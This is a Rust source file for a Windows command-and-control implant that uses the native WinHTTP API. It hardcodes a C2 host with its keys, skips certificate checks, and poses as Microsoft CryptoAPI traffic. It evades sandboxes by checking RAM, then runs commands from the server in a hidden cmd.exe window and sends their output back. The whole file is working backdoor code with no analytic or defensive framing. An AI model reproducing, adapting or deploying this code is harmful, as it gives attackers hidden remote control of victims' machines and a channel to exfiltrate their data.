// Pure WinHTTP Agent - No PowerShell, No BITS
// Uses only Windows native WinHTTP API
use std::thread;
use std::time::Duration;
use std::fs;
use std::env;
use std::path::PathBuf;
use std::ptr;
use std::os::windows::process::CommandExt;
use rand::Rng;
use serde::{Deserialize, Serialize};

fn get_c2() -> String { "geometry-offered-guns-replies.trycloudflare.com".to_string() }
fn get_api() -> String { "051dfe1cf5e570846315512a11396f7d".to_string() }
fn get_tok() -> String { "8ca60eebbe9a141869305ed9ab1a0050".to_string() }

#[derive(Deserialize)]
struct CmdResponse { command: Option<String> }

#[derive(Serialize)]
struct ResultPayload { result: String }

type HINTERNET = *mut std::ffi::c_void;

#[link(name = "winhttp")]
extern "system" {
    fn WinHttpOpen(agent: *const u16, access: u32, proxy: *const u16, bypass: *const u16, flags: u32) -> HINTERNET;
    fn WinHttpConnect(session: HINTERNET, server: *const u16, port: u16, reserved: u32) -> HINTERNET;
    fn WinHttpOpenRequest(connect: HINTERNET, verb: *const u16, path: *const u16, ver: *const u16, referrer: *const u16, accept: *const *const u16, flags: u32) -> HINTERNET;
    fn WinHttpSendRequest(request: HINTERNET, headers: *const u16, hdr_len: u32, optional: *const u8, opt_len: u32, total: u32, ctx: usize) -> i32;
    fn WinHttpReceiveResponse(request: HINTERNET, reserved: *mut std::ffi::c_void) -> i32;
    fn WinHttpReadData(request: HINTERNET, buffer: *mut u8, to_read: u32, read: *mut u32) -> i32;
    fn WinHttpCloseHandle(handle: HINTERNET) -> i32;
    fn WinHttpSetOption(handle: HINTERNET, option: u32, buffer: *const std::ffi::c_void, len: u32) -> i32;
    fn WinHttpAddRequestHeaders(request: HINTERNET, headers: *const u16, len: u32, modifiers: u32) -> i32;
}

fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn winhttp_get(host: &str, path: &str, api_key: &str) -> Option<String> {
    unsafe {
        let ua = to_wide("Microsoft-CryptoAPI/10.0");
        let session = WinHttpOpen(ua.as_ptr(), 0, ptr::null(), ptr::null(), 0);
        if session.is_null() { return None; }
        
        let host_w = to_wide(host);
        let connect = WinHttpConnect(session, host_w.as_ptr(), 443, 0);
        if connect.is_null() {
            WinHttpCloseHandle(session);
            return None;
        }
        
        let verb = to_wide("GET");
        let path_w = to_wide(path);
        let request = WinHttpOpenRequest(connect, verb.as_ptr(), path_w.as_ptr(), ptr::null(), ptr::null(), ptr::null(), 0x00800000);
        if request.is_null() {
            WinHttpCloseHandle(connect);
            WinHttpCloseHandle(session);
            return None;
        }
        
        // Ignore cert errors
        let flags: u32 = 0x00003300;
        WinHttpSetOption(request, 31, &flags as *const _ as *const _, 4);
        
        // Add headers
        let hdrs = to_wide(&format!("X-API-Key: {}\r\nUser-Agent: Microsoft-CryptoAPI/10.0\r\n", api_key));
        WinHttpAddRequestHeaders(request, hdrs.as_ptr(), u32::MAX, 0x20000000);
        
        if WinHttpSendRequest(request, ptr::null(), 0, ptr::null(), 0, 0, 0) == 0 {
            WinHttpCloseHandle(request);
            WinHttpCloseHandle(connect);
            WinHttpCloseHandle(session);
            return None;
        }
        
        if WinHttpReceiveResponse(request, ptr::null_mut()) == 0 {
            WinHttpCloseHandle(request);
            WinHttpCloseHandle(connect);
            WinHttpCloseHandle(session);
            return None;
        }
        
        let mut result = Vec::new();
        let mut buffer = [0u8; 4096];
        loop {
            let mut bytes_read: u32 = 0;
            if WinHttpReadData(request, buffer.as_mut_ptr(), buffer.len() as u32, &mut bytes_read) == 0 || bytes_read == 0 {
                break;
            }
            result.extend_from_slice(&buffer[..bytes_read as usize]);
        }
        
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        
        String::from_utf8(result).ok()
    }
}

fn winhttp_post(host: &str, path: &str, api_key: &str, body: &str) -> bool {
    unsafe {
        let ua = to_wide("Microsoft-CryptoAPI/10.0");
        let session = WinHttpOpen(ua.as_ptr(), 0, ptr::null(), ptr::null(), 0);
        if session.is_null() { return false; }
        
        let host_w = to_wide(host);
        let connect = WinHttpConnect(session, host_w.as_ptr(), 443, 0);
        if connect.is_null() {
            WinHttpCloseHandle(session);
            return false;
        }
        
        let verb = to_wide("POST");
        let path_w = to_wide(path);
        let request = WinHttpOpenRequest(connect, verb.as_ptr(), path_w.as_ptr(), ptr::null(), ptr::null(), ptr::null(), 0x00800000);
        if request.is_null() {
            WinHttpCloseHandle(connect);
            WinHttpCloseHandle(session);
            return false;
        }
        
        let flags: u32 = 0x00003300;
        WinHttpSetOption(request, 31, &flags as *const _ as *const _, 4);
        
        let hdrs = to_wide(&format!("X-API-Key: {}\r\nContent-Type: application/json\r\nUser-Agent: Microsoft-CryptoAPI/10.0\r\n", api_key));
        WinHttpAddRequestHeaders(request, hdrs.as_ptr(), u32::MAX, 0x20000000);
        
        let body_bytes = body.as_bytes();
        let result = WinHttpSendRequest(request, ptr::null(), 0, body_bytes.as_ptr(), body_bytes.len() as u32, body_bytes.len() as u32, 0);
        
        if result != 0 {
            WinHttpReceiveResponse(request, ptr::null_mut());
        }
        
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        
        result != 0
    }
}

fn run_cmd(cmd: &str) -> String {
    let temp = env::temp_dir().join(format!("wuc{}.tmp", rand::thread_rng().gen_range(1000..9999)));
    let temp_path = temp.to_string_lossy().to_string();
    
    // Use cmd.exe directly with output redirect
    let full_cmd = format!("{} > \"{}\" 2>&1", cmd, temp_path);
    
    let _ = std::process::Command::new("cmd.exe")
        .args(&["/c", &full_cmd])
        .creation_flags(0x08000000)
        .output();
    
    thread::sleep(Duration::from_millis(500));
    
    if let Ok(content) = fs::read_to_string(&temp) {
        let _ = fs::remove_file(&temp);
        return content;
    }
    "OK".to_string()
}

fn check_sandbox() -> bool {
    thread::sleep(Duration::from_secs(3));
    
    // Check RAM via wmic
    if let Ok(output) = std::process::Command::new("wmic")
        .args(&["computersystem", "get", "totalphysicalmemory"])
        .creation_flags(0x08000000)
        .output() 
    {
        let text = String::from_utf8_lossy(&output.stdout);
        if let Some(line) = text.lines().nth(1) {
            if let Ok(mem) = line.trim().parse::<u64>() {
                if mem < 2_000_000_000 { return false; }
            }
        }
    }
    true
}

fn main() {
    if !check_sandbox() { return; }
    
    let host = get_c2();
    let token = get_tok();
    let api_key = get_api();
    
    let hostname = env::var("COMPUTERNAME").unwrap_or_else(|_| "PC".to_string());
    let agent_id = format!("{}-{:04x}", hostname, rand::thread_rng().gen_range(1..=0xFFFF));
    
    let cmd_path = format!("/bits/cmd/{}?key={}", agent_id, token);
    let result_path = format!("/bits/result/{}?key={}", agent_id, token);
    
    loop {
        if let Some(resp) = winhttp_get(&host, &cmd_path, &api_key) {
            let cmd = serde_json::from_str::<CmdResponse>(&resp)
                .ok()
                .and_then(|r| r.command)
                .unwrap_or_else(|| resp.trim().to_string());
            
            if !cmd.is_empty() {
                let result = run_cmd(&cmd);
                let payload = serde_json::to_string(&ResultPayload { result })
                    .unwrap_or_else(|_| r#"{"result":"OK"}"#.to_string());
                
                winhttp_post(&host, &result_path, &api_key, &payload);
            }
        }
        
        let delay = rand::thread_rng().gen_range(5000..8000);
        thread::sleep(Duration::from_millis(delay));
    }
}
